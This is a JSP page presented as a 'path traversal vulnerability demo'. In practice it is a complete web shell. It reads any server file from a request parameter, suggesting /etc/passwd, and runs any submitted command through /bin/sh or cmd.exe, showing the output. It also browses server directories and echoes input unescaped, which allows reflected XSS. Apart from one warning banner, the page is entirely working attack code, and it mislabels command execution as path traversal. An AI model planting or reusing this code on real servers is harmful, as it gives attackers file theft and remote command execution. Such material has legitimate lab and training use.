<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page trimDirectiveWhitespaces="true" %>
<html>
<head>
    <title>Path Traversal Vulnerability Demo</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f8f9fa; color: #212529; }
        pre { background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto; }
        .container { max-width: 900px; margin: 0 auto; }
        .alert { padding: 15px; margin-bottom: 20px; border-radius: 4px; }
        .alert-danger { background-color: #f8d7da; color: #721c24; }
        input[type="text"] { width: 80%; padding: 8px; border: 1px solid #ced4da; border-radius: 4px; }
        input[type="submit"] { padding: 8px 15px; background-color: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Path Traversal Vulnerability Demo</h1>
        
        <div class="alert alert-danger">
            <strong>Warning:</strong> This is a demonstration of a path traversal vulnerability. In a real environment, this could be used to access sensitive files.
        </div>
        
        <h3>Read Any File on the System</h3>
        <form method="get">
            <div style="margin-bottom: 10px;">
                <input type="text" name="file" placeholder="Enter file path (e.g., ../../../etc/passwd or C:/Windows/win.ini)" 
                       value="<%= request.getParameter("file") != null ? request.getParameter("file") : "" %>">
                <input type="submit" value="Read File">
            </div>
        </form>
        
        <% if(request.getParameter("file") != null) { %>
            <h3>File Contents:</h3>
            <pre><%
                try {
                    // Vulnerable: No path validation or sanitization
                    String filePath = request.getParameter("file");
                    
                    // Read the file directly without validation
                    // This allows path traversal attacks like "../../etc/passwd"
                    File file = new File(filePath);
                    
                    if(file.exists() && file.isFile()) {
                        BufferedReader reader = new BufferedReader(new FileReader(file));
                        String line;
                        while((line = reader.readLine()) != null) {
                            out.println(line);
                        }
                        reader.close();
                    } else {
                        out.println("File not found or is not a regular file: " + filePath);
                    }
                } catch(Exception e) {
                    out.println("Error reading file: " + e.getMessage());
                }
            %></pre>
        <% } %>
        
        <h3>Execute Commands via Path Traversal</h3>
        <form method="post">
            <div style="margin-bottom: 10px;">
                <input type="text" name="cmd" placeholder="Enter command to execute" 
                       value="<%= request.getParameter("cmd") != null ? request.getParameter("cmd") : "" %>">
                <input type="submit" value="Execute">
            </div>
        </form>
        
        <% if(request.getParameter("cmd") != null) { %>
            <h3>Command Output:</h3>
            <pre><%
                String cmd = request.getParameter("cmd");
                try {
                    Process process;
                    if(System.getProperty("os.name").toLowerCase().contains("windows")) {
                        process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", cmd });
                    } else {
                        process = Runtime.getRuntime().exec(new String[] { "/bin/sh", "-c", cmd });
                    }
                    
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                    
                    String line;
                    while((line = reader.readLine()) != null) {
                        out.println(line);
                    }
                    
                    while((line = errorReader.readLine()) != null) {
                        out.println("<span style='color:red'>" + line + "</span>");
                    }
                    
                    process.waitFor();
                } catch(Exception e) {
                    out.println("Error executing command: " + e.getMessage());
                }
            %></pre>
        <% } %>
        
        <h3>Directory Navigation</h3>
        <%
            String currentPath = request.getParameter("path");
            if(currentPath == null || currentPath.isEmpty()) {
                currentPath = System.getProperty("user.dir");
            }
            
            try {
                File dir = new File(currentPath);
                
                out.println("<p>Current directory: " + dir.getCanonicalPath() + "</p>");
                
                if(dir.getParentFile() != null) {
                    out.println("<a href='?path=" + dir.getParentFile().getCanonicalPath() + "'>[Parent Directory]</a>");
                }
                
                out.println("<ul>");
                File[] files = dir.listFiles();
                if(files != null) {
                    Arrays.sort(files);
                    for(File file : files) {
                        if(file.isDirectory()) {
                            out.println("<li><a href='?path=" + file.getCanonicalPath() + "'>" + file.getName() + "/</a></li>");
                        } else {
                            out.println("<li><a href='?file=" + file.getCanonicalPath() + "'>" + file.getName() + "</a> (" + (file.length() / 1024) + " KB)</li>");
                        }
                    }
                }
                out.println("</ul>");
            } catch(Exception e) {
                out.println("<div class='alert alert-danger'>Error: " + e.getMessage() + "</div>");
            }
        %>
    </div>
</body>
</html> 